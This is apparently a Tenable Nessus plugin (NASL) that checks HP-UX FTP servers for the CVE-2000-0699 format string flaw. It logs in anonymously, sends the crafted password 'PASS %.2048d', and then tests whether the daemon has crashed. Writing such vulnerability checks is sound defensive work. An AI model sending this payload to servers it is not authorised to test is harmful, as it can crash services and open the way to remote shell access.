#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10490);
 script_bugtraq_id(1560);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0699");
 script_xref(name:"OSVDB", value:"389");

 script_name(english:"HP-UX FTP Daemon PASS Command Remote Format String");
 script_summary(english:"Checks if the remote ftp sanitizes the PASS command");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a format string stack overwrite
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote ftp server does not sanitize properly the argument of
the PASS command it receives for anonymous accesses.

It may be possible for a remote attacker to gain shell access." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-08/0028.html" );
 script_set_attribute(attribute:"solution", value:
"Patches are available from the vendor." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
                 
                 
script_end_attributes();

                    
 script_category(ACT_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
                  
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_kibuv_worm.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

if (get_kb_item('ftp/'+port+'/backdoor')) exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner || " FTP server" >!< banner ) exit(0);

# Connect to the FTP server
soc = open_sock_tcp(port);
ftpport = port;
if(soc)
{
 r = ftp_recv_line(socket:soc);
 if(!strlen(r))exit(0);

 
 req = string("USER ftp\r\n");
 send(socket:soc, data:req);
 
 r = ftp_recv_line(socket:soc);
 if(!strlen(r))exit(0);
 

 req = string("PASS %.2048d\r\n");
 send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 
 
 if(egrep(string:r, pattern:"^230 .*"))
 {
  req = string("HELP\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  if(!r)security_hole(port);
 }
 close(soc);
}
